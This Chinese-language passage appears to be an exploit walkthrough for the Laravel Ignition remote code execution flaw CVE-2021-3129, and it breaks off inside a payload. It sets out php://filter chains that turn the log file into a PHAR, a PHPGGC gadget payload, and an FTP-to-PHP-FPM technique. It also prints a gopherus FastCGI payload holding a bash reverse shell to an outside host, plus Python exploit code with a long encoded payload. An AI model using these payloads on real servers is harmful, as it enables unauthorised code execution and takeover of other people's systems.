\u9057\u61be\u7684\u662f\uff0c\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u5230\uff0c\u5982\u679c\u6ee5\u7528base64-decode\u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5728\u67d0\u4e2a\u65f6\u5019\u5931\u8d25\u3002\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u6765\u5229\u7528\u8fd9\u4e00\u70b9\uff1a\u5982\u679c\u6211\u4eec\u6ee5\u7528\u5b83\uff0c\u5c06\u53d1\u751f\u89e3\u7801\u9519\u8bef\uff0c\u65e5\u5fd7\u6587\u4ef6\u5c06\u88ab\u6e05\u9664\uff01\u8fd9\u6837\uff0c\u6211\u4eec\u89e6\u53d1\u7684\u4e0b\u4e00\u4e2a\u9519\u8bef\u5c06\u5355\u72ec\u5b58\u5728\u4e8e\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff1a [prefix]PAYLOAD[midfix]PAYLOAD[suffix] \u73b0\u5728\uff0c\u6211\u4eec\u53c8\u56de\u5230\u4e86\u6700\u521d\u7684\u95ee\u9898\u4e0a\uff1a\u4fdd\u7559\u4e00\u4e2apayload\u5e76\u5220\u9664\u5176\u4f59\u7684\u3002\u5e78\u8fd0\u7684\u662f\uff0cphp://filter\u5e76\u4e0d\u9650\u4e8ebase64\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5b83\u6765\u8f6c\u6362\u5b57\u7b26\u96c6\uff0c\u4e0b\u9762\u662f\u4eceUTF-16\u5230UTF-8\u7684\u8f6c\u6362\uff1a echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); \u535b\u6d6f\u2065\u7270\u6665\u7869\u5d20PAYLOAD\u6d5b\u6469\u6966\u5d78PAYLOAD\u535b\u6d6f\u2065\u7573\u6666\u7869\u5d20 \u6211\u4eec\u7684payload\u8fd8\u5728\u90a3\u91cc\uff0c\u5b89\u5168\u65e0\u6059\uff0c\u53ea\u662f\u524d\u7f00\u548c\u540e\u7f00\u53d8\u6210\u4e86\u975eASCII\u5b57\u7b26\u3002\u7136\u800c\uff0c\u5728\u65e5\u5fd7\u6761\u76ee\u4e2d\uff0c\u6211\u4eec\u7684payload\u51fa\u73b0\u4e86\u4e24\u6b21\uff0c\u800c\u4e0d\u662f\u4e00\u6b21\u3002\u6211\u4eec\u9700\u8981\u53bb\u6389\u7b2c\u4e8c\u4e2a\u3002 \u7531\u4e8e\u6bcf\u4e2aUTF-16\u5b57\u7b26\u5360\u7528\u4e24\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728PAYLOAD\u7684\u7b2c\u4e8c\u4e2a\u5b9e\u4f8b\u7684\u672b\u5c3e\u589e\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u6765\u4f7f\u5176\u65e0\u6cd5\u5bf9\u9f50\uff1a echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents ( 'php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt' ) ; \u535b\u6d6f\u2065\u7270\u6665\u7869\u5d20PAYLOAD\u5b58\u696d\u6664\u7869\u505d\u4100\u5900\u4c00\u4f00\u4100\u4400\u5800\u535b\u6d6f\u2065\u7573\u6666\u7869\u5d20 \u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\uff0c\u524d\u7f00\u7684\u5bf9\u9f50\u65b9\u5f0f\u4e0d\u518d\u91cd\u8981\uff1a\u5982\u679c\u524d\u7f00\u5927\u5c0f\u76f8\u7b49\uff0c\u7b2c\u4e00\u4e2apayload\u5c06\u88ab\u6b63\u786e\u89e3\u7801\uff1b\u5426\u5219\u7684\u8bdd\uff0c\u7b2c\u4e8c\u4e2apayload\u5c31\u4f1a\u88ab\u6b63\u786e\u89e3\u7801\u3002 \u5982\u679c\u5c06\u4e0a\u9762\u7684\u53d1\u73b0\u4e0e\u524d\u9762\u7684base64-decoding\u7ed3\u5408\u8d77\u6765\uff0c\u5c31\u80fd\u591f\u5bf9\u6211\u4eec\u60f3\u8981\u7684\u4efb\u4f55\u4e1c\u897f\u8fdb\u884c\u7f16\u7801\uff1a $ echo -n TEST! | base64 | sed -E 's/./\\0\\\\0/g' V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0 $ echo -ne '[Some prefix ]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[midfix]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt'); TEST! \u8bf4\u5230\u5bf9\u9f50\uff0c\u5982\u679c\u65e5\u5fd7\u6587\u4ef6\u672c\u8eab\u4e0d\u662f2\u5b57\u8282\u5bf9\u9f50\u7684\uff0c\u8f6c\u6362\u8fc7\u6ee4\u5668\u5c06\u5982\u4f55\u5904\u7406\uff1f PHP Warning: file_get_contents(): iconv stream filter(\"utf16le\"=>\"utf-8\"): invalid multibyte sequence in phpshell code on line 1 \u8fd9\u53c8\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u4e0d\u8fc7\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u4e24\u4e2apayload\u6765\u8f7b\u677e\u5730\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a\u4e00\u4e2a\u662f\u65e0\u5bb3\u7684payload A\uff0c\u53e6\u4e00\u4e2a\u662f\u5177\u6709\u653b\u51fb\u6027\u7684payload B\uff0c\u5177\u4f53\u5982\u4e0b\u6240\u793a\uff1a [prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix] [prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix] \u7531\u4e8e\u8fd9\u91cc\u524d\u7f00\u3001\u4e2d\u7f00\u548c\u540e\u7f00\u90fd\u5b58\u5728\u4e24\u4efd\uff0c\u8fd8\u63d0\u4f9b\u4e86payload_a\u548cpayload_b\uff0c\u6240\u4ee5\uff0c\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\u5fc5\u7136\u662f\u5076\u6570\uff0c\u4ece\u800c\u907f\u514d\u4e86\u9519\u8bef\u7684\u53d1\u751f\u3002 \u6700\u540e\uff0c\u6211\u4eec\u8fd8\u8981\u89e3\u51b3\u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6211\u4eec\u4f7f\u7528NULL\u5b57\u8282\u5c06payload\u7684\u5b57\u8282\u4ece\u4e00\u4e2a\u586b\u5145\u4e3a\u4e24\u4e2a\u3002\u5728PHP\u4e2d\u8bd5\u56fe\u52a0\u8f7d\u4e00\u4e2a\u5e26\u6709NULL\u5b57\u8282\u7684\u6587\u4ef6\u65f6\uff0c\u4f1a\u751f\u6210\u4ee5\u4e0b\u9519\u8bef\uff1a PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1 \u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u65e0\u6cd5\u5728\u9519\u8bef\u65e5\u5fd7\u4e2d\u6ce8\u5165\u5e26\u6709NULL\u5b57\u8282\u7684payload\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6700\u540e\u4e00\u4e2a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u5e2e\u5230\u6211\u4eec\uff0c\u5b83\u5c31\u662fconvert.quoted-printable-decode\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528=00\u5bf9NULL\u5b57\u8282\u8fdb\u884c\u7f16\u7801\u3002 \u4e0b\u9762\u662f\u6211\u4eec\u6700\u7ec8\u7684\u8f6c\u6362\u94fe\uff1a \u00b6 viewFile:php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.ba se64-decode/resource=/path/to/storage/logs/laravel.log \u521b\u5efa\u4e00\u4e2aPHPGGC payload\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\uff1a php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g' U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 \u6e05\u7a7a\u65e5\u5fd7 viewFile: php://filter/write = convert.base64-decode | convert.base64-decode | convert.base64-decode/resource = /path/to/storage/logs/laravel.log \u521b\u5efa\u7b2c\u4e00\u4e2a\u65e5\u5fd7\u6761\u76ee\uff0c\u7528\u4e8e\u5bf9\u9f50\uff1a viewFile: AA \u521b\u5efa\u5e26\u6709payload\u65e5\u5fd7\u6761\u76ee\uff1a viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 \u901a\u8fc7\u6211\u4eec\u7684\u8fc7\u6ee4\u5668\u5c06\u65e5\u5fd7\u6587\u4ef6\u8f6c\u6362\u4e3a\u6709\u6548\u7684PHAR\uff1a viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log \u542f\u52a8PHAR\u7684\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\uff1a viewFile: phar:///path/to/storage/logs/laravel.log \u5229\u7528FTP\u4e0ePHP-FPM\u8fdb\u884c\u4ea4\u4e92 \u00b6 \u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fd0\u884cfile_get_contents\u6765\u67e5\u627e\u4efb\u4f55\u4e1c\u897f\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001HTTP\u8bf7\u6c42\u6765\u626b\u63cf\u5e38\u7528\u7aef\u53e3\u3002\u7ed3\u679c\u53d1\u73b0\uff0cPHP-FPM\u4f3c\u4e4e\u6b63\u5728\u4fa6\u542c\u7aef\u53e39000\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u5982\u679c\u6211\u4eec\u80fd\u5411PHP-FPM\u670d\u52a1\u53d1\u9001\u4e00\u4e2a\u4efb\u610f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u5728\u673a\u5668\u4e0a\u6267\u884c\u4ee3\u7801\u3002\u8fd9\u79cd\u6280\u672f\u7ecf\u5e38\u4e0egopher://\u534f\u8bae\u7ed3\u5408\u4f7f\u7528\uff0ccurl\u652f\u6301gopher://\u534f\u8bae\uff0c\u4f46PHP\u5374\u4e0d\u652f\u6301\u3002 \u53e6\u4e00\u4e2a\u5df2\u77e5\u7684\u5141\u8bb8\u901a\u8fc7TCP\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\u5305\u7684\u534f\u8bae\u662fFTP\uff0c\u66f4\u51c6\u786e\u7684\u8bf4\u662f\u8be5\u534f\u8bae\u7684\u88ab\u52a8\u6a21\u5f0f\uff1a\u5982\u679c\u4e00\u4e2a\u5ba2\u6237\u7aef\u8bd5\u56fe\u4eceFTP\u670d\u52a1\u5668\u4e0a\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\uff08\u6216\u5199\u5165\uff09\uff0c\u670d\u52a1\u5668\u4f1a\u901a\u77e5\u5ba2\u6237\u7aef\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u8bfb\u53d6\uff08\u6216\u5199\uff09\u5230\u4e00\u4e2a\u7279\u5b9a\u7684IP\u548c\u7aef\u53e3\u4e0a\u3002\u800c\u4e14\uff0c\u8fd9\u91cc\u5bf9\u8fd9\u4e9bIP\u548c\u7aef\u53e3\u6ca1\u6709\u8fdb\u884c\u5fc5\u8981\u7684\u9650\u5236\u3002\u4f8b\u5982\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u544a\u8bc9\u5ba2\u6237\u7aef\u8fde\u63a5\u5230\u81ea\u5df1\u7684\u4e00\u4e2a\u7aef\u53e3\uff0c\u5982\u679c\u5b83\u613f\u610f\u7684\u8bdd\u3002 \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528viewFile= ftp://evil-server.lexfo.fr/file.txt\u6765\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e \uff0c\u4f1a\u53d1\u751f\u4ee5\u4e0b\u60c5\u51b5\uff1a file_get_contents()\u8fde\u63a5\u5230\u6211\u4eec\u7684FTP\u670d\u52a1\u5668\uff0c\u5e76\u4e0b\u8f7dfile.txt\u3002 file_put_contents()\u8fde\u63a5\u5230\u6211\u4eec\u7684FTP\u670d\u52a1\u5668\uff0c\u5e76\u5c06\u5176\u4e0a\u4f20\u56defile.txt\u3002 \u60a8\u53ef\u80fd\u5df2\u7ecf\u77e5\u9053\u8fd9\u662f\u600e\u4e48\u56de\u4e8b\uff1a\u6211\u4eec\u5c06\u4f7f\u7528FTP\u534f\u8bae\u7684\u88ab\u52a8\u6a21\u5f0f\u8ba9file_get_contents()\u5728\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u5f53\u5b83\u8bd5\u56fe\u4f7f\u7528file_put_contents()\u628a\u5b83\u4e0a\u4f20\u56de\u53bb\u65f6\uff0c\u6211\u4eec\u5c06\u544a\u8bc9\u5b83\u628a\u6587\u4ef6\u53d1\u9001\u5230127.0.0.1:9000\u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5411PHP-FPM\u53d1\u9001\u4e00\u4e2a\u4efb\u610f\u7684\u6570\u636e\u5305\uff0c\u4ece\u800c\u6267\u884c\u4ee3\u7801\u3002 \u5229\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u5728\u6211\u4eec\u7684\u76ee\u6807\u4e0a\u6210\u529f\u5730\u5229\u7528\u4e86\u8be5\u6f0f\u6d1e\u3002 \u4e0b\u9762\u6211\u4eec\u6765\u6f14\u793a\u4e00\u4e0b\u653b\u51fb\u8fc7\u7a0b\u3002 \u9996\u5148\uff0c\u6211\u4eec\u4f7f\u7528gopherus\u751f\u6210\u653b\u51fbfastcgi\u7684payload\uff1a python gopherus.py --exploit fastcgi /var/www/public/index.php # \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u76ee\u6807\u4e3b\u673a\u4e0a\u4e00\u4e2a\u5df2\u77e5\u5b58\u5728\u7684php\u6587\u4ef6 bash -c \"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\" # \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u8981\u6267\u884c\u7684\u547d\u4ee4 \u5f97\u5230payload\uff0c\u800c\u6211\u4eec\u9700\u8981\u7684\u662f\u4e0a\u9762payload\u4e2d **_**\u540e\u9762\u7684\u6570\u636e\u90e8\u5206\uff0c\u5373\uff1a %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 \u5c06\u6570\u636e\u6dfb\u52a0\u5230\u5982\u4e0b**FTP\u811a\u672c**\u4e2d\u7684payload(\u811a\u672c\u5728\u6587\u7ae0\u672b\u5c3e\u548c POC\u76ee\u5f55\u4e2d) \u76d1\u542c\u521a\u521a\u7684\u53cd\u5f39shell\u7aef\u53e3\u5e76\u8fd0\u884c FTP\u811a\u672c \u53d1\u9001\u8bf7\u6c42\u53cd\u5f39shell POST /_ig n i t io n /execu te - solu t io n HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8888 Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 191 { \"solution\" : \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"ftp://aaa@xxx.xxx.xxx.xxx:23/123\" } } [!NOTE] \u4f7f\u7528Docker\u73af\u5883\u65e0\u6cd5\u590d\u73b0\uff0c\u9700\u8981\u642d\u5efa\u53e6\u4e00\u4e2a\u73af\u5883 \u6f0f\u6d1e\u5229\u7528POC \u00b6 https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py # -*- coding: utf-8 -*- import requests , json import sys , re proxies = { \"http\" : '127.0.0.1:8080' } header = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\" , \"Content-Type\" : \"application/json\" } def clearlog ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def AA ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"AA\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def sendpayloadwindows ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=